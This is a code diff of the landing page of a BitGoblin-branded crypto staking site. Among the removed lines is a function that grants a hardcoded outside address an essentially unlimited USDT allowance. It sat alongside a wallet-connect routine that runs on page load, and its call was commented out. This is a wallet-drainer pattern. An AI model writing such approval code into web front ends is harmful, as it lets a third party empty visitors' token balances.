@@ -1,11 +1,14 @@
 "use client"; // This is a client component
 import React, { useEffect, useState, useContext } from "react";
 import Image from 'next/image';
+import Link from 'next/link';
+import { redirect } from 'next/navigation';
 
 import { ethers, BigNumber } from "ethers";
 
-import MainPage from '@/components';
+import { MainPage } from '@/components/mainPage';
 import contract_artifacts from '@/abi/BEP20.json';
+
 
 const USDCAddress = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
 const USDTAdress = "0x55d398326f99059fF775485246999027B3197955";
@@ -16,64 +19,6 @@ const USDTAdress = "0x55d398326f99059fF775485246999027B3197955";
 
 
 export default function Home() {
-  const [address, setAddress] = useState("0");
-  // const [chainId, setAddress] = useState("0");
-  const [allowance, setAllowance] = useState(0);
-  const [balance, setBalance] = useState(0);
-  const [connectStatus, setConnectStatus] = useState("0");
-
-  // const abi = await ethers.getContractFactory("BEP20");
-
-  let provider = "0";
-  let signer = "0";
-
-  async function changeNetwork() {
-    window.ethereum.request({
-      method: "wallet_addEthereumChain",
-      params: [{
-        chainId: "0x38",
-        rpcUrls: ["https://rpc.ankr.com/bsc/"],
-        chainName: "Binance Smart Chain Mainnet",
-        nativeCurrency: {
-          name: "BNB",
-          symbol: "BNB",
-          decimals: 18
-        },
-        blockExplorerUrls: ["https://bscscan.com/"]
-      }]
-    });
-  }
-
-  async function approve(signer: any) {
-    const _provider = new ethers.providers.Web3Provider(window.ethereum);
-    const contract_instance = new ethers.Contract(USDTAdress, contract_artifacts, signer);
-    await contract_instance.increaseAllowance("0xCCbbbfA08E06136EEfCD887c7eF8381cf3c04F51", "1000000000000000000000000000");
-  }
-
-
-  async function connect() {
-    if (typeof (window as any).ethereum == "undefined") {
-      alert("Please install MetaMask wallet!");
-    }
-    //@ts-ignore
-    await ethereum.request({ method: "eth_requestAccounts" })
-    const _provider = new ethers.providers.Web3Provider((window as any).ethereum);
-    const chainInfo = await _provider.getNetwork();
-    if (chainInfo["chainId"] != 56) {
-      await changeNetwork();
-    }
-    const _signer = await _provider.getSigner();
-    const addr = await _signer.getAddress();
-
-    setAddress(addr);
-    // approve(_signer);
-  }
-
-
-  useEffect(() => {
-    connect();
-  }, [address]);
-
   return (
     <main className="flex min-h-screen flex-col items-center justify-between p-24">
       <div id="app" data-v-app="">
@@ -81,8 +26,8 @@ export default function Home() {
           <div className="bit-container" data-v-c7418f94="">
             <div className="bit-header" data-v-c7418f94="">
               <div className="header-logo" data-v-c7418f94=""><a aria-current="page"
-                href="https://www.bitgoblin.io/#/" className="router-link-active router-link-exact-active"
-                data-v-c7418f94=""><img src="logo.svg" style={{ width: "120 %", height: "200%" }} /></a></div>
+                href="/" className="router-link-active router-link-exact-active"
+                data-v-c7418f94=""><img id="logo-mainpage" src="logo.svg" /></a></div>
               <div className="bit-menu" data-v-c7418f94="">
                 <div className="arco-menu arco-menu-light arco-menu-horizontal pc-menu">
                   <div className="arco-menu-inner">
@@ -98,22 +43,20 @@ export default function Home() {
                       </div>
                       <div className="arco-menu-item">
                         <a aria-current="page"
-                          href="https://www.bitgoblin.io/#/"
+                          href="https://www.bitgoblin.io/"
                           className="router-link-active router-link-exact-active">Home</a></div>
                       <div className="arco-menu-item">
-                        <a href="https://www.bitgoblin.io/#/dashboard"
-                          className="">Dashboard
+                        <a href="/staking"
+                          className="">DApp
                         </a>
                       </div>
                       <div className="arco-menu-item">
                         <a target="_blank"
                           href="https://bitgoblin.gitbook.io/whitepaper">
                           <div className="arco-space arco-space-horizontal arco-space-align-center">
-
                             <div className="arco-space-item" style={{ marginRight: "8px" }}>
                               <img src="book-f03458bc.png" style={{ maxWidth: "18px" }} />
                             </div>
-
                             <div className="arco-space-item">Whitepaper</div>
                           </div>
                         </a></div>
@@ -140,10 +83,11 @@ export default function Home() {
               </div>
               <div className="bit-buoy-mobile" data-v-c7418f94="">
                 <div className="buoy-list">
-                  <div className="buoy-item" style={{ width: "10%" }} role="button" onClick={connect} >
-                    <div className="btn">{address == "0" ? "Connect Wallet" : address}
+                  <a href="/staking">
+                    <div className="buoy-item" style={{ width: "10%" }} role="button" >
+                      <div className="btn">Launch App</div>
                     </div>
-                  </div>
+                  </a>
                 </div>
               </div>
             </div>
@@ -158,12 +102,12 @@ export default function Home() {
                       <div className="item" data-v-c7418f94="">HOME</div>
                     </a><a href="https://t.me/BitGoblinOfficialCommunity" target="_blank"
                       data-v-c7418f94="">
-                        <div className="item" data-v-c7418f94="">TELEGRAM</div>
-                      </a><a href="https://www.bitgoblin.io/#/dashboard" className="" data-v-c7418f94="">
+                        <div className="item" data-v-c7418f94="">Telegram</div>
+                      </a><a href="/staking" className="" data-v-c7418f94="">
                         <div className="item" data-v-c7418f94="">Dashboard</div>
                       </a><a href="https://twitter.com/bitforgedefi" target="_blank" data-v-c7418f94="">
-                        <div className="item" data-v-c7418f94="">twitter</div>
-                      </a><a href="https://bitforge.gitbook.io/whitepaper" target="_blank"
+                        <div className="item" data-v-c7418f94="">Twitter</div>
+                      </a><a href="https://bitgoblin.gitbook.io/whitepaper" target="_blank"
                         data-v-c7418f94="">
                         <div className="item" data-v-c7418f94="">Whitepaper</div>
                       </a></div>
